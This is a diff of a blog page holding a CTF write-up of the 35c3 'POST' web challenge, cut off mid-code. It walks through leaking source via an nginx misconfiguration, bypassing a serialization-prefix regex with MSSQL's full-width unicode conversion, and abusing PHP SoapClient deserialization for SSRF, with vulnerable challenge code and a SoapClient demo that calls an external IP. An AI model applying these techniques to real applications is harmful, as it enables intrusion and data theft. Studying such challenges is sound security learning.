@@ -1,81 +1,9 @@
-<!doctype html><html lang=en-us>
-<head><meta charset=utf-8>
-<meta name=viewport content="width=device-width,initial-scale=1">
-<link rel=manifest href=/manifest.json><meta name=description content="之前看到了 35c3 的比赛，但是没时间打，看了看题，发现这个题还是不错的，单独拿出来学习一下
-"><title>35c3 POST复盘记录</title>
-<link rel=canonical href=https://blog.zeddyu.info/2019/03/23/35c3-POST%E5%A4%8D%E7%9B%98%E8%AE%B0%E5%BD%95/>
-<link rel=stylesheet href=/scss/style.min.css><meta property="og:title" content="35c3 POST复盘记录">
-<meta property="og:description" content="之前看到了 35c3 的比赛，但是没时间打，看了看题，发现这个题还是不错的，单独拿出来学习一下
-">
-<meta property="og:url" content="https://blog.zeddyu.info/2019/03/23/35c3-POST%E5%A4%8D%E7%9B%98%E8%AE%B0%E5%BD%95/">
-<meta property="og:site_name" content="Zeddy's Blog">
-<meta property="og:type" content="article"><meta property="article:section" content="Posts"><meta property="article:tag" content="CTF"><meta property="article:tag" content="wp"><meta property="article:published_time" content="2019-03-23T00:29:30+00:00"><meta property="article:modified_time" content="2019-03-23T00:29:30+00:00">
-<meta name=twitter:site content="@ZeddYu_Lu">
-<meta name=twitter:creator content="@ZeddYu_Lu"><meta name=twitter:title content="35c3 POST复盘记录">
-<meta name=twitter:description content="之前看到了 35c3 的比赛，但是没时间打，看了看题，发现这个题还是不错的，单独拿出来学习一下
-">
-<script async src="https://www.googletagmanager.com/gtag/js?id=G-PDESKL57LT"></script>
-<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','G-PDESKL57LT',{anonymize_ip:!1})}</script>
-</head>
-<body class="article-page has-toc">
-<script>(function(){const a='StackColorScheme';localStorage.getItem(a)||localStorage.setItem(a,"auto")})()</script><script>(function(){const b='StackColorScheme',a=localStorage.getItem(b),c=window.matchMedia('(prefers-color-scheme: dark)').matches===!0;a=='dark'||a==='auto'&&c?document.documentElement.dataset.scheme='dark':document.documentElement.dataset.scheme='light'})()</script>
-<div class="container main-container flex
-extended">
-<div id=article-toolbar>
-<a href=https://blog.zeddyu.info class=back-home><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="15 6 9 12 15 18"/></svg>
-<span>Back</span>
-</a>
-</div>
-<main class="main full-width">
-<article class=main-article>
-<header class=article-header>
-<div class=article-details>
-<header class=article-category>
-<a href=/categories/CTF/ style=background-color:#ce0000;color:#fff>
-CTF
-</a>
-</header>
-<h2 class=article-title>
-<a href=/2019/03/23/35c3-POST%E5%A4%8D%E7%9B%98%E8%AE%B0%E5%BD%95/>35c3 POST复盘记录</a>
-</h2>
-<footer class=article-time>
-<div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
-<time class=article-time--published>Mar 23, 2019</time>
-</div>
-<div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
-<time class=article-time--reading>
-8 minute read
-</time>
-</div>
-</footer>
-</div>
-</header>
-<section class=article-content>
-<p>之前看到了 35c3 的比赛，但是没时间打，看了看题，发现这个题还是不错的，单独拿出来学习一下</p>
-<p>[TOC]</p>
-<h2 id=post>POST</h2>
-<h3 id=description>Description</h3>
-<blockquote>
-<p>​ Go make some <a class=link href=http://35.207.83.242/ target=_blank rel=noopener>posts</a>.</p>
-<p>Hint: flag is in db</p>
-<p>Hint2: the lovely XSS is part of the beautiful design and insignificant for the challenge</p>
-<p>Hint3: You probably want to get the source code, luckily for you it&rsquo;s rather hard to configure nginx correctly.</p>
-</blockquote>
-<h3 id=attacking-steps>Attacking Steps</h3>
-<p>这里简述一下攻击链</p>
-<ul>
-<li><strong>nginx misconfiguration</strong></li>
-<li><strong>arbitrary unserialize</strong></li>
-<li><strong>SoapClient SSRF</strong></li>
-<li><strong>SoapClient CRLF injection</strong></li>
-<li><strong>miniProxy URL scheme bypass</strong></li>
-<li><strong>Connect to MSSQL via gopher</strong></li>
-<li><strong>Get flag</strong></li>
-</ul>
-<h3 id=hacking>Hacking</h3>
-<h4 id=nginx-misconfiguration>Nginx Misconfiguration</h4>
-<p>根据 hint2 ，我们扫目录的时候可以发现</p>
-<pre tabindex=0><code>[00:42:47] Starting:
+<!doctype html><html lang=en-us><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><link rel=manifest href=/manifest.json><meta name=description content="之前看到了 35c3 的比赛，但是没时间打，看了看题，发现这个题还是不错的，单独拿出来学习一下
+"><title>35c3 POST复盘记录</title><link rel=canonical href=https://blog.zeddyu.info/2019/03/23/35c3-POST%E5%A4%8D%E7%9B%98%E8%AE%B0%E5%BD%95/><link rel=stylesheet href=/scss/style.min.css><meta property="og:title" content="35c3 POST复盘记录"><meta property="og:description" content="之前看到了 35c3 的比赛，但是没时间打，看了看题，发现这个题还是不错的，单独拿出来学习一下
+"><meta property="og:url" content="https://blog.zeddyu.info/2019/03/23/35c3-POST%E5%A4%8D%E7%9B%98%E8%AE%B0%E5%BD%95/"><meta property="og:site_name" content="Zeddy's Blog"><meta property="og:type" content="article"><meta property="article:section" content="Posts"><meta property="article:tag" content="CTF"><meta property="article:tag" content="wp"><meta property="article:published_time" content="2019-03-23T00:29:30+00:00"><meta property="article:modified_time" content="2019-03-23T00:29:30+00:00"><meta name=twitter:site content="@ZeddYu_Lu"><meta name=twitter:creator content="@ZeddYu_Lu"><meta name=twitter:title content="35c3 POST复盘记录"><meta name=twitter:description content="之前看到了 35c3 的比赛，但是没时间打，看了看题，发现这个题还是不错的，单独拿出来学习一下
+"><script async src="https://www.googletagmanager.com/gtag/js?id=G-PDESKL57LT"></script>
+<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-PDESKL57LT",{anonymize_ip:!1})}</script></head><body class="article-page has-toc"><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex
+extended"><div id=article-toolbar><a href=https://blog.zeddyu.info class=back-home><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="15 6 9 12 15 18"/></svg><span>Back</span></a></div><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><header class=article-category><a href=/categories/CTF/ style=background-color:#ce0000;color:#fff>CTF</a></header><h2 class=article-title><a href=/2019/03/23/35c3-POST%E5%A4%8D%E7%9B%98%E8%AE%B0%E5%BD%95/>35c3 POST复盘记录</a></h2><footer class=article-time><div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg><time class=article-time--published>Mar 23, 2019</time></div><div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg><time class=article-time--reading>8 minute read</time></div></footer></div></header><section class=article-content><p>之前看到了 35c3 的比赛，但是没时间打，看了看题，发现这个题还是不错的，单独拿出来学习一下</p><p>[TOC]</p><h2 id=post>POST</h2><h3 id=description>Description</h3><blockquote><p>​ Go make some <a class=link href=http://35.207.83.242/ target=_blank rel=noopener>posts</a>.</p><p>Hint: flag is in db</p><p>Hint2: the lovely XSS is part of the beautiful design and insignificant for the challenge</p><p>Hint3: You probably want to get the source code, luckily for you it&rsquo;s rather hard to configure nginx correctly.</p></blockquote><h3 id=attacking-steps>Attacking Steps</h3><p>这里简述一下攻击链</p><ul><li><strong>nginx misconfiguration</strong></li><li><strong>arbitrary unserialize</strong></li><li><strong>SoapClient SSRF</strong></li><li><strong>SoapClient CRLF injection</strong></li><li><strong>miniProxy URL scheme bypass</strong></li><li><strong>Connect to MSSQL via gopher</strong></li><li><strong>Get flag</strong></li></ul><h3 id=hacking>Hacking</h3><h4 id=nginx-misconfiguration>Nginx Misconfiguration</h4><p>根据 hint2 ，我们扫目录的时候可以发现</p><pre tabindex=0><code>[00:42:47] Starting:
 [00:42:47] 400 -  182B  - /%2e%2e/google.com
 [00:42:52] 301 -  194B  - /inc  -&gt;  http://localhost/inc/
 [00:42:52] 403 -  580B  - /inc/config.inc
@@ -91,235 +19,163 @@ CTF
 [00:42:56] 403 -  580B  - /uploads/
 
 Task Completed
-</code></pre><p>uploads 处发现了两处 403 的地方，而且服务器是 Nginx，而且拿其他一些扫描器也报了目录列举的洞</p>
-<p>可以参考<a class=link href=https://www.freebuf.com/articles/web/149761.html target=_blank rel=noopener>Nginx不安全配置可能导致的安全漏洞</a>与<a class=link href=https://www.leavesongs.com/PENETRATION/nginx-insecure-configuration.html target=_blank rel=noopener>三个案例看Nginx配置安全</a></p>
-<p><figure>
-<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008852.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008852.jpg loading=lazy>
-</a>
-</figure></p>
-<p>下载得到源码</p>
-<h4 id=arbitrary-unserialize-i>Arbitrary Unserialize I</h4>
-<p>我们可以很明显地在 db.php 中发现反序列化的影子</p>
-<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=k>private</span> <span class=k>static</span> <span class=k>function</span> <span class=nf>prepare_params</span><span class=p>(</span><span class=nv>$params</span><span class=p>)</span> <span class=p>{</span>
-    <span class=k>return</span> <span class=nx>array_map</span><span class=p>(</span><span class=k>function</span><span class=p>(</span><span class=nv>$x</span><span class=p>){</span>
-        <span class=k>if</span> <span class=p>(</span><span class=nx>is_object</span><span class=p>(</span><span class=nv>$x</span><span class=p>)</span> <span class=k>or</span> <span class=nx>is_array</span><span class=p>(</span><span class=nv>$x</span><span class=p>))</span> <span class=p>{</span>
-            <span class=k>return</span> <span class=s1>&#39;$serializedobject$&#39;</span> <span class=o>.</span> <span class=nx>serialize</span><span class=p>(</span><span class=nv>$x</span><span class=p>);</span>
-        <span class=p>}</span>
-        <span class=k>if</span> <span class=p>(</span><span class=nx>preg_match</span><span class=p>(</span><span class=s1>&#39;/^\$serializedobject\$/i&#39;</span><span class=p>,</span> <span class=nv>$x</span><span class=p>))</span> <span class=p>{</span>
-            <span class=k>die</span><span class=p>(</span><span class=s2>&#34;invalid data&#34;</span><span class=p>);</span>
-            <span class=k>return</span> <span class=s2>&#34;&#34;</span><span class=p>;</span>
-        <span class=p>}</span>
-        <span class=k>return</span> <span class=nv>$x</span><span class=p>;</span>
-    <span class=p>},</span> <span class=nv>$params</span><span class=p>);</span>
-<span class=p>}</span>
-
-<span class=k>private</span> <span class=k>static</span> <span class=k>function</span> <span class=nf>retrieve_values</span><span class=p>(</span><span class=nv>$res</span><span class=p>)</span> <span class=p>{</span>
-    <span class=nv>$result</span> <span class=o>=</span> <span class=k>array</span><span class=p>();</span>
-    <span class=k>while</span> <span class=p>(</span><span class=nv>$row</span> <span class=o>=</span> <span class=nx>sqlsrv_fetch_array</span><span class=p>(</span><span class=nv>$res</span><span class=p>))</span> <span class=p>{</span>
-        <span class=nv>$result</span><span class=p>[]</span> <span class=o>=</span> <span class=nx>array_map</span><span class=p>(</span><span class=k>function</span><span class=p>(</span><span class=nv>$x</span><span class=p>){</span>
-            <span class=k>return</span> <span class=nx>preg_match</span><span class=p>(</span><span class=s1>&#39;/^\$serializedobject\$/i&#39;</span><span class=p>,</span> <span class=nv>$x</span><span class=p>)</span> <span class=o>?</span>
-                <span class=nx>unserialize</span><span class=p>(</span><span class=nx>substr</span><span class=p>(</span><span class=nv>$x</span><span class=p>,</span> <span class=mi>18</span><span class=p>))</span> <span class=o>:</span> <span class=nv>$x</span><span class=p>;</span>
-        <span class=p>},</span> <span class=nv>$row</span><span class=p>);</span>
-    <span class=p>}</span>
-    <span class=k>return</span> <span class=nv>$result</span><span class=p>;</span>
-<span class=p>}</span>
-</code></pre></div><p>这里还是比较明显的，但是要怎么构造这个 POP 链呢，我看了一下不是特别明显，也是涉及到了 soapclient 的构造与利用。而且整个构造也需要比较耐心来看，否则会陷入复现都比较懵逼的情况。</p>
-<p>首先有反序列化的点，肯定需要有利用的类，否则光有反序列化的点，没有利用的类也没什么用。所以接下来我们需要去找一个可以利用的类。</p>
-<h4 id=bypass-mssql>ByPass Mssql</h4>
-<p>虽然确定了有反序列化漏洞，但是触发反序列化的条件就是</p>
-<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=nx>preg_match</span><span class=p>(</span><span class=s1>&#39;/^\$serializedobject\$/i&#39;</span><span class=p>,</span> <span class=nv>$x</span><span class=p>)</span> <span class=o>?</span> <span class=nx>unserialize</span><span class=p>(</span><span class=nx>substr</span><span class=p>(</span><span class=nv>$x</span><span class=p>,</span> <span class=mi>18</span><span class=p>))</span> <span class=o>:</span> <span class=nv>$x</span><span class=p>;</span>
-</code></pre></div><p>虽然前面插入数据有给数据增加<code>$serializedobject$</code>的地方，但是这里需要数组或者对象，而我们传入的只能是字符串，所以不能利用这个点。</p>
-<p>这里怎么绕过对<code>/^\$serializedobject\$/i</code>的正则判断呢？这里就需要用到 Mssql 的一个特性了。</p>
-<blockquote>
-<p>​ MSSQL converts full-width unicode characters to their ASCII representation. For example, if a string contains 0xEF 0xBC 0x84, it will be stored as $.</p>
-</blockquote>
-<p>也就是说，**MSSQL会自动将全角unicode字符转换为ASCII表示形式。**例如，如果字符串包含<code>0xEF 0xBC 0x84</code>，则将其存储为<code>$</code>。<code>$s℮rializedobject$</code> 入库后会变成 <code>$serializedobject$</code>，注意前者的 ℮ 不是 ASCII 的 e，整个字符串的 16 进制如下，可见前者的 ℮ 的 hex 是 E284AE，而后者 e 的 ASCII 是 0x65。</p>
-<p>所以我们可以利用这个特性进行绕过，可以用 burp 直接修改十六进制来操作</p>
-<h4 id=soapclient>Soapclient</h4>
-<p>这里我们简单讲一下 soapclient</p>
-<blockquote>
-<p>​ public SoapClient::SoapClient ( <a class=link href=http://php.net/manual/zh/language.pseudo-types.php#language.types.mixed target=_blank rel=noopener>mixed</a> <code>$wsdl</code> [, array <code>$options</code> ] )</p>
-<p>This constructor creates <a class=link href=http://php.net/manual/zh/class.soapclient.php target=_blank rel=noopener>SoapClient</a> objects in <em>WSDL</em> or <em>non-WSDL</em> mode.</p>
-</blockquote>
-<p>这是一个 php 的内部类，简单来说就是用来创建 soap 数据报文，与 wsdl 接口进行交互的。</p>
-<p><figure>
-<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610001161.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610001161.jpg loading=lazy>
-</a>
-</figure></p>
-<p>其中<code>__call</code>的魔术方法就比较有意思了</p>
-<blockquote>
-<p>​ SoapClient::__call</p>
-<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=k>public</span> <span class=nx>SoapClient</span><span class=o>::</span><span class=na>__call</span> <span class=p>(</span> <span class=nx>string</span> <span class=nv>$function_name</span> <span class=p>,</span> <span class=k>array</span> <span class=nv>$arguments</span> <span class=p>)</span> <span class=o>:</span> <span class=nx>mixed</span>
-</code></pre></div><p>Calling this method directly is deprecated. Usually, SOAP functions can be called as methods of the <a class=link href=http://php.net/manual/zh/class.soapclient.php target=_blank rel=noopener>SoapClient</a>object; in situations where this is not possible or additional options are needed, use <a class=link href=http://php.net/manual/zh/soapclient.soapcall.php target=_blank rel=noopener>SoapClient::__soapCall()</a>.</p>
-</blockquote>
-<p>当 SoapClient 建立的时候就会调用这个魔术方法。而且还有一点小特性</p>
-<blockquote>
-<p>​ 当调用 SoapClient 类的 __call() 魔术方法的时候，会发送一个 POST 请求，请求的参数由着 SoapClient 类的一些参数决定。</p>
-<p>__call() 魔术方法：当调用一个类不存在的方法时候会触发这个魔术方法</p>
-</blockquote>
-<p>比如我们以下代码：</p>
-<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=o>&lt;?</span><span class=nx>php</span>
-<span class=nv>$a</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>SoapClient</span><span class=p>(</span><span class=k>null</span><span class=p>,</span> <span class=k>array</span><span class=p>(</span><span class=s1>&#39;location&#39;</span> <span class=o>=&gt;</span> <span class=s2>&#34;http://106.14.153.173:2015&#34;</span><span class=p>,</span><span class=s1>&#39;uri&#39;</span><span class=o>=&gt;</span> <span class=s2>&#34;123&#34;</span><span class=p>));</span>
-<span class=nv>$b</span> <span class=o>=</span> <span class=nx>serialize</span><span class=p>(</span><span class=nv>$a</span><span class=p>);</span>
-<span class=k>echo</span> <span class=nv>$b</span><span class=p>;</span>
-<span class=nv>$c</span> <span class=o>=</span> <span class=nx>unserialize</span><span class=p>(</span><span class=nv>$b</span><span class=p>);</span>
-<span class=nv>$c</span><span class=o>-&gt;</span><span class=na>hack</span><span class=p>();</span>
-<span class=cp>?&gt;</span><span class=err>
-</span></code></pre></div><p>当我们直接运行这段代码的时候，就因为调用了一个<code>SoapClient</code>不存在的方法<code>hack()</code>导致直接调用了<code>__call()</code>魔术方法</p>
-<p><figure>
-<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005272.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005272.jpg loading=lazy>
-</a>
-</figure></p>
-<p>详细可以参考<a class=link href=https://xz.aliyun.com/t/2148 target=_blank rel=noopener>N1CTF Easy&&Hard Php Writeup</a></p>
-<p>####Arbitrary Unserialize II</p>
-<p>好的，我们简单的介绍完了<code>soapclient</code>，接下来我们可以比较明显的看到在 post.php 处有一处类的方法的调用</p>
-<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=k>class</span> <span class=nc>Attachment</span> <span class=p>{</span>
-    <span class=k>private</span> <span class=nv>$url</span> <span class=o>=</span> <span class=k>NULL</span><span class=p>;</span>
-    <span class=k>private</span> <span class=nv>$za</span> <span class=o>=</span> <span class=k>NULL</span><span class=p>;</span>
-    <span class=k>private</span> <span class=nv>$mime</span> <span class=o>=</span> <span class=k>NULL</span><span class=p>;</span>
-
-    <span class=k>public</span> <span class=k>function</span> <span class=fm>__construct</span><span class=p>(</span><span class=nv>$url</span><span class=p>)</span> <span class=p>{</span>
-        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>url</span> <span class=o>=</span> <span class=nv>$url</span><span class=p>;</span>
-        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>mime</span> <span class=o>=</span> <span class=p>(</span><span class=k>new</span> <span class=nx>finfo</span><span class=p>)</span><span class=o>-&gt;</span><span class=na>file</span><span class=p>(</span><span class=s2>&#34;../&#34;</span><span class=o>.</span><span class=nv>$url</span><span class=p>);</span>
-        <span class=k>if</span> <span class=p>(</span><span class=nx>substr</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>mime</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>11</span><span class=p>)</span> <span class=o>==</span> <span class=s2>&#34;Zip archive&#34;</span><span class=p>)</span> <span class=p>{</span>
-            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>mime</span> <span class=o>=</span> <span class=s2>&#34;Zip archive&#34;</span><span class=p>;</span>
-            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>za</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>ZipArchive</span><span class=p>;</span>
-        <span class=p>}</span>
-    <span class=p>}</span>
-
-    <span class=k>public</span> <span class=k>function</span> <span class=fm>__toString</span><span class=p>()</span> <span class=p>{</span>
-        <span class=nv>$str</span> <span class=o>=</span> <span class=s2>&#34;&lt;a href=&#39;</span><span class=si>{</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>url</span><span class=si>}</span><span class=s2>&#39;&gt;&#34;</span><span class=o>.</span><span class=nx>basename</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>url</span><span class=p>)</span><span class=o>.</span><span class=s2>&#34;&lt;/a&gt; (</span><span class=si>$this-&gt;mime</span><span class=s2> &#34;</span><span class=p>;</span>
-        <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>is_null</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>za</span><span class=p>))</span> <span class=p>{</span>
-            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>za</span><span class=o>-&gt;</span><span class=na>open</span><span class=p>(</span><span class=s2>&#34;../&#34;</span><span class=o>.</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>url</span><span class=p>);</span>
-            <span class=nv>$str</span> <span class=o>.=</span> <span class=s2>&#34;with &#34;</span><span class=o>.</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>za</span><span class=o>-&gt;</span><span class=na>numFiles</span> <span class=o>.</span> <span class=s2>&#34; Files.&#34;</span><span class=p>;</span>
-        <span class=p>}</span>
-        <span class=k>return</span> <span class=nv>$str</span><span class=o>.</span> <span class=s2>&#34;)&#34;</span><span class=p>;</span>
-    <span class=p>}</span>
-<span class=p>}</span>
-</code></pre></div><p>就是在<code>this->za->open()</code>处，我们可以充分利用<code>SoapClient</code>的特点进行构造，然而我们需要触发<code>Attachment</code>这个类的<code>__toString()</code>魔术方法，则需要一个<code>echo</code>的地方，然后发现在 default.php 这里有比较好的利用的点</p>
-<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=o>&lt;?</span><span class=nx>php</span> 
-<span class=k>include</span> <span class=s1>&#39;inc/post.php&#39;</span><span class=p>;</span>
-<span class=cp>?&gt;</span><span class=err>
-</span><span class=err>&lt;?php
-</span><span class=err>    if (isset($_POST[&#34;title&#34;])) {
-</span><span class=err>        $attachments = array();
-</span><span class=err>        if (isset($_FILES[&#34;attach&#34;]) &amp;&amp; is_array($_FILES[&#34;attach&#34;])) {
-</span><span class=err>            
-</span><span class=err>            $folder = sha1(random_bytes(10));
-</span><span class=err>            mkdir(&#34;../uploads/$folder&#34;);
-</span><span class=err>            for ($i = 0; $i &lt; count($_FILES[&#34;attach&#34;][&#34;tmp_name&#34;]); $i++) {
-</span><span class=err>                if ($_FILES[&#34;attach&#34;][&#34;error&#34;][$i] !== 0) continue;
-</span><span class=err>                $name = basename($_FILES[&#34;attach&#34;][&#34;name&#34;][$i]);
-</span><span class=err>                move_uploaded_file($_FILES[&#34;attach&#34;][&#34;tmp_name&#34;][$i], &#34;../uploads/$folder/$name&#34;);
-</span><span class=err>                $attachments[] = new Attachment(&#34;/uploads/$folder/$name&#34;);
-</span><span class=err>            }
-</span><span class=err>        }
-</span><span class=err>        $post = new Post($_POST[&#34;title&#34;], $_POST[&#34;content&#34;], $attachments);
-</span><span class=err>        $post-&gt;save();
-</span><span class=err>    }
-</span><span class=err>    if (isset($_GET[&#34;action&#34;])) {
-</span><span class=err>        if ($_GET[&#34;action&#34;] == &#34;restart&#34;) {
-</span><span class=err>            Post::truncate();
-</span><span class=err>            header(&#34;Location: /&#34;);
-</span><span class=err>            die;
-</span><span class=err>        } else {
-</span><span class=err>?&gt;
-</span><span class=err>&lt;?php 
-</span><span class=err>            }
-</span><span class=err>    }
-</span><span class=err>
-</span><span class=err>    $posts = Post::loadall();
-</span><span class=err>    if (empty($posts)) {
-</span><span class=err>        echo &#34;&lt;b&gt;You do not have any posts. Create &lt;a href=\&#34;/?action=create\&#34;&gt;some&lt;/a&gt;!&lt;/b&gt;&#34;;
-</span><span class=err>    } else {
-</span><span class=err>        echo &#34;&lt;b&gt;You have &#34; . count($posts) .&#34; posts. Create &lt;a href=\&#34;/?action=create\&#34;&gt;some&lt;/a&gt; more if you want! Or &lt;a href=\&#34;/?action=restart\&#34;&gt;restart your blog&lt;/a&gt;.&lt;/b&gt;&#34;;
-</span><span class=err>    }
-</span><span class=err>
-</span><span class=err>    foreach($posts as $p) {
-</span><span class=err>        echo $p;
-</span><span class=err>        echo &#34;&lt;br&gt;&lt;br&gt;&#34;;
-</span><span class=err>    }  
-</span><span class=err>?&gt;
-</span></code></pre></div><p>而且在 post.php 中，<code>class Post</code>还存在一个这个魔术方法，其中把<code>$attach</code>拼接到了字符串当中，所以这里是先调用了<code>Post</code>类的<code>__toString</code>魔术方法，紧接着调用<code>Attachment</code>类的<code>__toString</code>魔术方法，也就可以调用到了<code>$this->za->open()</code>的方法。</p>
-<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=k>public</span> <span class=k>function</span> <span class=fm>__construct</span><span class=p>(</span><span class=nv>$title</span><span class=p>,</span> <span class=nv>$content</span><span class=p>,</span> <span class=nv>$attachments</span><span class=o>=</span><span class=s2>&#34;&#34;</span><span class=p>)</span> <span class=p>{</span>
-    <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>title</span> <span class=o>=</span> <span class=nv>$title</span><span class=p>;</span>
-    <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>content</span> <span class=o>=</span> <span class=nv>$content</span><span class=p>;</span>
-    <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>attachment</span> <span class=o>=</span> <span class=nv>$attachments</span><span class=p>;</span>
-<span class=p>}</span>
-
-<span class=k>public</span> <span class=k>function</span> <span class=nf>save</span><span class=p>()</span> <span class=p>{</span>
-    <span class=k>global</span> <span class=nv>$USER</span><span class=p>;</span>
-    <span class=k>if</span> <span class=p>(</span><span class=nx>is_null</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>id</span><span class=p>))</span> <span class=p>{</span>
-        <span class=nx>DB</span><span class=o>::</span><span class=na>insert</span><span class=p>(</span><span class=s2>&#34;INSERT INTO posts (userid, title, content, attachment) VALUES (?,?,?,?)&#34;</span><span class=p>,</span> 
-                   <span class=k>array</span><span class=p>(</span><span class=nv>$USER</span><span class=o>-&gt;</span><span class=na>uid</span><span class=p>,</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>title</span><span class=p>,</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>content</span><span class=p>,</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>attachment</span><span class=p>));</span>
-    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
-        <span class=nx>DB</span><span class=o>::</span><span class=na>query</span><span class=p>(</span><span class=s2>&#34;UPDATE posts SET title = ?, content = ?, attachment = ? WHERE userid = ? AND id = ?&#34;</span><span class=p>,</span>
-                  <span class=k>array</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>title</span><span class=p>,</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>content</span><span class=p>,</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>attachment</span><span class=p>,</span> <span class=nv>$USER</span><span class=o>-&gt;</span><span class=na>uid</span><span class=p>,</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>id</span><span class=p>));</span>
-    <span class=p>}</span>
-<span class=p>}</span>
-
-<span class=k>public</span> <span class=k>function</span> <span class=fm>__toString</span><span class=p>()</span> <span class=p>{</span>
-    <span class=nv>$str</span> <span class=o>=</span> <span class=s2>&#34;&lt;h2&gt;</span><span class=si>{</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>title</span><span class=si>}</span><span class=s2>&lt;/h2&gt;&#34;</span><span class=p>;</span>
-    <span class=nv>$str</span> <span class=o>.=</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>content</span><span class=p>;</span>
-    <span class=nv>$str</span> <span class=o>.=</span> <span class=s2>&#34;&lt;hr&gt;Attachments:&lt;br&gt;&lt;il&gt;&#34;</span><span class=p>;</span>
-    <span class=k>foreach</span> <span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>attachment</span> <span class=k>as</span> <span class=nv>$attach</span><span class=p>)</span> <span class=p>{</span>
